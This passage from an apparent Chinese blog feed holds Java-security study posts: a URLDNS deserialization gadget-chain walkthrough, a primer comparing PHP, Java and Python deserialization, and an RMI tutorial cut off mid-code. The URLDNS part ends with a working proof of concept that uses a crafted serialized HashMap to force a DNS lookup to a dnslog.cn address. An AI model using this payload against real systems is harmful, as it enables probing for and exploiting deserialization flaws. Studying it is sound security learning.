src="https://bu.dusays.com/2024/05/23/664f03825a85a.png" alt="image-20240523161547410"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>)</span><br></pre></td></tr></table></figure><p>既然计算了hash 那我们就看看hash里面是个怎么个事 点进去(ctrl+左键 后面就都是点进去了 )</p><p>也是在hashmap包中</p><p><img src="https://bu.dusays.com/2024/05/23/664f0381cc2f1.png" alt="image-20240523161939261"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="type">int</span> h;</span><br><span class="line">        <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到hash方法是调用了hashcode()方法 点进去</p><p><img src="https://bu.dusays.com/2024/05/23/664f0381d08b5.png" alt="image-20240523162158463"></p><p>是Object包中的一个方法</p><p>URLDNS 中使⽤的这个key是⼀个 <code>java.net.URL</code> 对象，我们看看其 hashCode ⽅法：</p><p>在我们建的这个包里访问URL 点进去</p><p><img src="https://bu.dusays.com/2024/05/23/664f038163020.png" alt="image-20240523162405585"></p><p>里面同样是有个hashCode()方法 看看</p><p><img src="https://bu.dusays.com/2024/05/23/664f03821f2b2.png" alt="image-20240523162504965"></p><p>当hashCode的值不为-1是才会继续往下执行</p><p>而hashCode的默认值就是-1</p><p><img src="https://bu.dusays.com/2024/05/23/664f038174e83.png" alt="image-20240523162634095"></p><p>此时， handler 是 URLStreamHandler 对象（的某个⼦类对象），继续跟进其 hashCode ⽅法：</p><p><img src="https://bu.dusays.com/2024/05/23/664f03823e81f.png" alt="image-20240523162723296"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the protocol part.</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">protocol</span> <span class="operator">=</span> u.getProtocol();</span><br><span class="line">        <span class="keyword">if</span> (protocol != <span class="literal">null</span>)</span><br><span class="line">            h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the host part.</span></span><br><span class="line">        <span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br><span class="line">        <span class="keyword">if</span> (addr != <span class="literal">null</span>) &#123;</span><br><span class="line">            h += addr.hashCode();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();</span><br><span class="line">            <span class="keyword">if</span> (host != <span class="literal">null</span>)</span><br><span class="line">                h += host.toLowerCase().hashCode();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the file part.</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> u.getFile();</span><br><span class="line">        <span class="keyword">if</span> (file != <span class="literal">null</span>)</span><br><span class="line">            h += file.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the port part.</span></span><br><span class="line">        <span class="keyword">if</span> (u.getPort() == -<span class="number">1</span>)</span><br><span class="line">            h += getDefaultPort();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            h += u.getPort();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the ref part.</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">ref</span> <span class="operator">=</span> u.getRef();</span><br><span class="line">        <span class="keyword">if</span> (ref != <span class="literal">null</span>)</span><br><span class="line">            h += ref.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> h;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到这⾥有调⽤ <code>getHostAddress</code> ⽅法</p><p>我这里跟出来是这样的</p><p><img src="https://bu.dusays.com/2024/05/23/664f0381c4ff6.png" alt="image-20240523162907845"></p><p>但是 也可能跟出来是这样的：</p><p><img src="https://bu.dusays.com/2024/05/23/664f0381c9170.png" alt="image-20240523163123169"></p><p>版本问题 不影响</p><p>我们⽤⼀些第三⽅的反连平台就可以查看到这次请求，证明的确存在反序列化漏洞(DNS外带验证)</p><p>所以，整个 URLDNS 的Gadget其实清晰⼜简单： </p><blockquote><ol><li>HashMap-&gt;readObject() </li><li>HashMap-&gt;hash() </li><li>URL-&gt;hashCode() </li><li>URLStreamHandler-&gt;hashCode()  </li><li>URLStreamHandler-&gt;getHostAddress() </li><li>InetAddress-&gt;getByName()</li></ol></blockquote><p>要构造这个Gadget，只需要初始化⼀个 <code>java.net.URL</code> 对象，作为 key 放在 java.util.HashMap 中；然后，设置这个 URL 对象的 hashCode 为初始值 -1 ，这样反序列化时将会重新计算 其 hashCode ，才能触发到后⾯的DNS请求，否则不会调⽤ URL-&gt;hashCode() </p><p>另外，ysoserial为了防⽌在⽣成Payload的时候也执⾏了URL请求和DNS查询，所以重写了⼀ 个 <code>SilentURLStreamHandler</code> 类，这不是必须的</p><p>这里也有个其他的exp通过利用URLDNS来进行DNSlag</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://mm4dhq.dnslog.cn/&quot;</span>);<span class="comment">//这里替换为DNSLog平台分配的地址</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clas</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clas.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(url,<span class="number">123</span>); <span class="comment">//将url的hashcode属性改为123使其不等于-1</span></span><br><span class="line">        map.put(url,<span class="string">&quot;2333&quot;</span>); <span class="comment">//这里的value用不上，随便设置</span></span><br><span class="line">        field.set(url,-<span class="number">1</span>);<span class="comment">//put完之后，我们就需要将hashcode属性改回成-1，从而能执行handler.hashcode</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//序列化</span></span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./2.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(outputStream);</span><br><span class="line">            outputStream1.writeObject(map);</span><br><span class="line">            outputStream.close();</span><br><span class="line">            outputStream1.close();</span><br><span class="line">            <span class="comment">//反序列化，此时触发dns请求</span></span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./2.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inputStream);</span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line">            objectInputStream.close();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> java </tag>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反序列化前置</title>
      <link href="/2024/05/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%89%8D%E7%BD%AE/"/>
      <url>/2024/05/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%89%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="JAVA反序列化前置"><a href="#JAVA反序列化前置" class="headerlink" title="JAVA反序列化前置"></a>JAVA反序列化前置</h1><p>我们在调试RMI时会发现，其发送、接收的数据都是反序列化数据</p><p>其他不同语言都拥有此类方法(发序列化)，且多少都拥有相关的漏洞</p><p>那么，为什么反序列化常常会带来安全隐患？</p><p>编程语言如果需要在网络上传递信息，通常会用到一些格式化数据：</p><ul><li>JSON</li><li>XML</li></ul><p>JSON和XML是通用数据交互格式，通常用于不同语言、不同环境下数据的交互，比如前端的JavaScript通过JSON和后端服务通信、微信服务器通过XML和公众号服务器通信。但这两个数据格式都有一个共同的问题：<strong>不支持复杂的数据类型。</strong></p><p>大多数处理方法中，JSON和XML支持的数据类型就是基本数据类型，整型、浮点型、字符串、布尔等，如果开发者希望在传输数据的时候直接传输一个对象，那么就不得不想办法<strong>扩展基础的JSON（XML）语法。</strong></p><p>比如，Jackson和Fastjson这类序列化库，在JSON（XML）的基础上进行改造，通过特定的语法来传递对象；亦或者如RMI，直接使用Java等语言内置的序列化方法，将一个对象转换成一串二进制数据进行传输。</p><p>不管是Jackson、Fastjson还是编程语言内置的序列化方法，<strong>一旦涉及到序列化与反序列化数据，就可能会涉及到安全问题</strong>。但首先要理解的是，“反序列化漏洞”是对一类漏洞的泛指，而不是专指某种反序列化方法导致的漏洞，比如Jackson反序列化漏洞和Java readObject造成的反序列化漏洞就是完全不同的两种漏洞。</p><p>接下来我们先学习readObject造成的反序列化漏洞</p><h2 id="反序列化方法的对比"><a href="#反序列化方法的对比" class="headerlink" title="反序列化方法的对比"></a>反序列化方法的对比</h2><p>在此之前我们已经学习了php 和 python的反序列化 那么他们和java反序列化有什么差别呢</p><p>Java的反序列化和PHP的反序列化其实有点类似，他们都只能将一个对象中的属性按照某种特定的格式生成一段数据流，在反序列化的时候再按照这个格式将属性拿回来，再赋值给新的对象。</p><p>但Java相对PHP序列化更深入的地方在于，其提供了更加高级、灵活地方法 <code>writeObject</code> ，允许开发者在序列化流中插入一些自定义数据，进而在反序列化的时候能够使用 readObject 进行读取。</p><p>当然，PHP中也提供了一个魔术方法叫 <code>__wakeup</code> ，在反序列化的时候进行触发。看似Java的<code>readObject</code> 和PHP的 <code>__wakeup</code> 类似，但其实不全对，虽然都是在反序列化的时候触发，但他们解决的问题稍微有些差异。</p><p>Java设计 <code>readObject</code> 的思路和PHP的 <code>__wakeup</code> 不同点在于： <code>readObject</code> 倾向于解决“<strong>反序列化时如何还原一个完整对象</strong>”这个问题，而PHP的 <code>__wakeup</code> 更倾向于解决“<strong>反序列化后如何初始化这个对象</strong>”的问题。</p><h3 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h3><p>这个没什么好讲的</p><p>PHP的序列化是<strong>开发者不能参与</strong>的，开发者调用 serialize 函数后，序列化的数据就已经完成了，你得到的是一个完整的对象，<strong>你并不能在序列化数据流里新增某一个内容，你如果想插入新的内容，只有将其保存在一个属性中</strong>。也就是说PHP的序列化、反序列化是一个纯内部的过程，而其 <code>__sleep</code> 、<code>__wakeup</code> 魔术方法的目的就是在序列化、反序列化的前后执行一些操作。</p><p>具体的代码我就不写了 大家应该都懂</p><p>PHP的反序列化漏洞，很少是由 <code>__wakeup </code>这个方法触发的，通常触发在析构函数<code>__destruct </code>里。其实大部分PHP反序列化漏洞，都并不是由反序列化导致的，只是通过反序列化可以控制对象的属性，进而在后续的代码中进行危险操作。</p><h3 id="java反序列化"><a href="#java反序列化" class="headerlink" title="java反序列化"></a>java反序列化</h3><p>Java反序列化的操作，很多是需要开发者深入参与的，所以你会发现大量的库会实现 <code>readObject</code> 、<code>writeObject</code> 方法，这和PHP中 <code>__wakeup</code> 、 <code>__sleep</code> 很少使用是存在鲜明对比的。</p><h4 id="classAnnotations"><a href="#classAnnotations" class="headerlink" title="classAnnotations"></a>classAnnotations</h4><p>在序列化Java类的时候用到了一个类，叫 ObjectOutputStream 。这个类内部有一个方法 annotateClass ,ObjectOutputStream 的子类有需要向序列化后的数据里放任何内容，都可以重写这个方法，写入你自己想要写入的数据。然后反序列化时，就可以读取到这个信息并使用。</p><p>所以，我们在分析序列化数据时看到的 classAnnotations ，实际上就是 annotateClass 方法写入的内容</p><h4 id="objectAnnotation"><a href="#objectAnnotation" class="headerlink" title="objectAnnotation"></a>objectAnnotation</h4><p>Java在序列化时一个对象，将会调用这个对象中的 <code>writeObject</code> 方法，参数类型是<code>ObjectOutputStream</code> ，开发者可以将任何内容写入这个stream中；反序列化时，会调用 readObject ，开发者也可以从中读取出前面写入的内容，并进行处理。</p><p>例：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.Ser;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> String name;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;  </span><br><span class="line">  </span><br><span class="line">    Person(String name, <span class="type">int</span> age) &#123;  </span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">        <span class="built_in">this</span>.age = age;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">   </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream s)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        s.defaultWriteObject();  </span><br><span class="line">        s.writeObject(<span class="string">&quot;This is an object&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">   </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line">        s.defaultReadObject();  </span><br><span class="line">        <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> (String) s.readObject();  </span><br><span class="line">        System.out.println(message);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里在执行完默认的 <code>s.defaultWriteObject()</code> 后，我向stream里写入了一个字符串 This is a object 。我们用上一章讲的工具<code>SerializationDumper</code>查看此时生成的序列化数据：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">STREAM_MAGIC - 0xac ed</span><br><span class="line">STREAM_VERSION - 0x00 05</span><br><span class="line">Contents</span><br><span class="line">TC_OBJECT - 0x73</span><br><span class="line">TC_CLASSDESC - 0x72</span><br><span class="line">className</span><br><span class="line">Length - 21 - 0x00 15</span><br><span class="line">Value - org.vulhub.Ser.Person -</span><br><span class="line">0x6f72672e76756c6875622e5365722e506572736f6e</span><br><span class="line">serialVersionUID - 0xf1 ad b2 c3 a9 83 d4 5c</span><br><span class="line">newHandle 0x00 7e 00 00</span><br><span class="line">classDescFlags - 0x03 - SC_WRITE_METHOD | SC_SERIALIZABLE</span><br><span class="line">fieldCount - 3 - 0x00 03</span><br><span class="line">Fields</span><br><span class="line">0:</span><br><span class="line">Int - I - 0x49</span><br><span class="line">fieldName</span><br><span class="line">Length - 3 - 0x00 03</span><br><span class="line">Value - age - 0x616765</span><br><span class="line">1:</span><br><span class="line">Object - L - 0x4c</span><br><span class="line">fieldName</span><br><span class="line">Length - 4 - 0x00 04</span><br><span class="line">Value - name - 0x6e616d65</span><br><span class="line">className1</span><br><span class="line">TC_STRING - 0x74</span><br><span class="line">newHandle 0x00 7e 00 01</span><br><span class="line">Length - 18 - 0x00 12</span><br><span class="line">Value - Ljava/lang/String; -</span><br><span class="line">0x4c6a6176612f6c616e672f537472696e673b</span><br><span class="line">2:</span><br><span class="line">Object - L - 0x4c</span><br><span class="line">fieldName</span><br><span class="line">Length - 8 - 0x00 08</span><br><span class="line">Value - password - 0x70617373776f7264</span><br><span class="line">className1</span><br><span class="line">TC_REFERENCE - 0x71</span><br><span class="line">Handle - 8257537 - 0x00 7e 00 01</span><br><span class="line">classAnnotations</span><br><span class="line">TC_ENDBLOCKDATA - 0x78</span><br><span class="line">superClassDesc</span><br><span class="line">TC_NULL - 0x70</span><br><span class="line">newHandle 0x00 7e 00 02</span><br><span class="line">classdata</span><br><span class="line">org.vulhub.Ser.Person</span><br><span class="line">values</span><br><span class="line">age</span><br><span class="line">(int)22 - 0x00 00 00 16</span><br><span class="line">name</span><br><span class="line">(object)</span><br><span class="line">TC_STRING - 0x74</span><br><span class="line">newHandle 0x00 7e 00 03</span><br><span class="line">Length - 3 - 0x00 03</span><br><span class="line">Value - Bob - 0x426f62</span><br><span class="line">password</span><br><span class="line">(object)</span><br><span class="line">TC_STRING - 0x74</span><br><span class="line">newHandle 0x00 7e 00 04</span><br><span class="line">Length - 6 - 0x00 06</span><br><span class="line">Value - secret - 0x736563726574</span><br><span class="line">objectAnnotation</span><br><span class="line">TC_STRING - 0x74</span><br><span class="line">newHandle 0x00 7e 00 05</span><br><span class="line">Length - 16 - 0x00 10</span><br><span class="line">Value - This is a object - 0x546869732069732061206f626a656374</span><br><span class="line">TC_ENDBLOCKDATA - 0x78</span><br></pre></td></tr></table></figure><p>可见，我们写入的字符串 This is a object 被放在 objectAnnotation 的位置。 在反序列化时，我读取了这个字符串，并将其输出：</p><p><img src="https://bu.dusays.com/2024/05/23/664f02f09edc6.png" alt="image-20240523152213089"></p><p>这个特性就让Java的开发变得非常灵活。比如后面将会讲到的<code>HashMap</code>，其就是将Map中的所有键、 值都存储在 <code>objectAnnotation</code> 中，而并不是某个具体属性里。</p><h3 id="python反序列化"><a href="#python反序列化" class="headerlink" title="python反序列化"></a>python反序列化</h3><p>Python反序列化和Java、PHP有个显著的区别，就是Python的反序列化过程实际上是在<strong>执行一个基于栈的虚拟机</strong>。我们可以向栈上增、删对象，也可以执行一些指令，比如函数的执行等，甚至可以用这个虚拟机执行一个完整的应用程序。</p><p>所以，Python的反序列化可以立即导致任意函数、命令执行漏洞，与需要gadget的PHP和Java相比更加危险</p><p>pickle反序列化就不多说了</p><p><strong>python&gt;java&gt;php</strong></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总结一下，从危害上来看，Python的反序列化危害是最大的；从应用广度上来看，Java的反序列化是最常被用到的；从反序列化的原理上来看，PHP和Java是类似又不尽相同的。</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java-RMI</title>
      <link href="/2024/05/23/java-RMI/"/>
      <url>/2024/05/23/java-RMI/</url>
      
        <content type="html"><![CDATA[<h1 id="JAVA-RMI"><a href="#JAVA-RMI" class="headerlink" title="JAVA - RMI"></a>JAVA - RMI</h1><p>这个还是理解了挺久的 </p><p>主要是第一次代码审计 又枯燥又难 审着犯困 效率挺低的</p><h2 id="RMI基础"><a href="#RMI基础" class="headerlink" title="RMI基础"></a>RMI基础</h2><p>RMI 作为后续漏洞中最为基本的利用手段之一，学习的必要性非常之大</p><p>如果只懂利用，就太脚本小子了</p><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>java RMI全称为 java Remote Method Invocation（java <strong>远程方法调用</strong>），是java编程语言中，一种实现远程过程调用的应用程序编程接口。存储于java.rmi包中，使用其方法调用对象时，必须实现Remote远程接口，<strong>能够让某个java虚拟机上的对象调用另外一个Java虚拟机中的对象上的方法</strong>。两个虚拟机可以运行在相同计算机上的不同进程，也可以是网络上的不同计算机。两者之间通过网络进行通信。</p><h3 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h3><p><img src="https://bu.dusays.com/2024/05/23/664f0226c68f1.png" alt="image-20240520083835683"></p><p>如上图：</p><p>基本分为三层架构模式来实现 RMI</p><p>分别为 RMI 服务端，RMI 客户端和 RMI 注册中心。</p><h4 id="客户端：-Client-上图右边部分"><a href="#客户端：-Client-上图右边部分" class="headerlink" title="客户端：(Client  上图右边部分)"></a><strong>客户端：(Client  上图右边部分)</strong></h4><p>存根 &#x2F; 桩 (Stub): 远程对象在客户端上的代理；<br>远程引用层 (Remote Reference Layer): 解析并执行远程引用协议；<br>传输层 (Transport): 发送调用、传递远程方法参数、接收远程方法执行结果。</p><h4 id="服务段：（Server-上图中间部分）"><a href="#服务段：（Server-上图中间部分）" class="headerlink" title="服务段：（Server 上图中间部分）"></a><strong>服务段：（Server 上图中间部分）</strong></h4><p>骨架 (Skeleton): 读取客户端传递的方法参数，调用服务器方的实际对象方法， 并接收方法执行后的返回值；<br>远程引用层 (Remote Reference Layer): 处理远程引用后向骨架发送远程方法调用；<br>传输层 (Transport): 监听客户端的入站连接，接收并转发调用到远程引用层。</p><blockquote><p>其是理论上有客户端有服务段就可以进行远程方法的调用了 但是RMI是通过端口进行调用的 这就出现一个问题：端口只有0到65535这明显是不够用的 不能全来给RMI吧 所以这就出现了RMI的第三部分：注册表</p></blockquote><h4 id="注册表（Registry-上图的左侧部分）"><a href="#注册表（Registry-上图的左侧部分）" class="headerlink" title="注册表（Registry 上图的左侧部分）"></a><strong>注册表（Registry 上图的左侧部分）</strong></h4><p>以 URL 形式注册远程对象，并向客户端回复对远程对象的引用</p><blockquote><p>注册中心，是一个 hash 表，用来存储名字和远程对象。</p><p>客户端是连接注册中心，获取名字来调用远程对象。</p><p>客户端和服务端并不是直接进行交互的，而是利用了代理。服务端的代理叫做 Skeleton，客户端的代理叫做 Stub</p><p>用代理的目的是为了把不属于业务的东西提取出来。</p></blockquote><p>客户端-&gt;注册表-&gt;服务端</p><h2 id="通信流程"><a href="#通信流程" class="headerlink" title="通信流程"></a>通信流程</h2><h3 id="服务端："><a href="#服务端：" class="headerlink" title="服务端："></a>服务端：</h3><p><strong>1. 先编写一个远程接口，其中定义了一个 sayHello () 的方法</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRemoteObj</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String keywords)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>此远程接口要求作用域为 public；<br>继承 Remote 接口；<br>让其中的接口方法抛出异常</p></blockquote><p><strong>2. 定义该接口的实现类 Impl</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObjImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">IRemoteObj</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RemoteObjImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException&#123;</span><br><span class="line"><span class="comment">//        UnicastRemoteObject.exportObject(this, 0);</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String keywords)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">upKeywords</span> <span class="operator">=</span> keywords.toUpperCase();</span><br><span class="line">        System.out.println(upKeywords);</span><br><span class="line">        <span class="keyword">return</span> upKeywords;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>实现远程接口</p><p>继承 UnicastRemoteObject 类，用于生成 Stub（存根）和 Skeleton（骨架）。 这个在后续的通信原理当中会讲到</p><p>构造函数需要抛出一个 RemoteException 错误</p><p>实现类中使用的对象必须都可序列化，即都继承 <code>java.io.Serializable</code></p></blockquote><p><strong>3. 注册远程对象</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="comment">// 实例化远程对象  </span></span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>();</span><br><span class="line">        <span class="comment">// 创建注册中心  </span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">r</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span> );</span><br><span class="line">        <span class="comment">// 绑定对象示例到注册中心  </span></span><br><span class="line">        r.bind(<span class="string">&quot;remoteObj&quot;</span>,remoteObj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>port 默认是 1099，不写会自动补上，其他端口必须写</p><p>bind 的绑定这里，只要和客户端去查找的 registry 一致即可。</p></blockquote><p>如此，服务端就写好了</p><p>⼀个RMI Server分为三部分：</p><ol><li><p>⼀个继承了 java.rmi.Remote 的接⼝，其中定义我们要远程调⽤的函数，⽐如这⾥的 hello()</p></li><li><p>⼀个实现了此接⼝的类</p></li><li><p>⼀个主类，⽤来创建Registry，并将上⾯的类实例化后绑定到⼀个地址。这就是我们所谓的Server了。</p></li></ol><h3 id="客户端："><a href="#客户端：" class="headerlink" title="客户端："></a>客户端：</h3><p>客户端只需从从注册器中获取远程对象，然后调用方法即可。当然客户端还需要一个远程对象的接口，不然不知道获取回来的对象是什么类型的。</p><p>虽说执⾏远程⽅法的时候代码是在远程服务器上执⾏的，但实际上我们还是需要知道有哪些⽅法，这时候接⼝的重要性就体现了</p><p>所以在客户端这里，也需要定义一个远程对象的接口：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRemoteObj</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String keywords)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后编写客户端的代码，获取远程对象，并调用方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException &#123;</span><br><span class="line">        <span 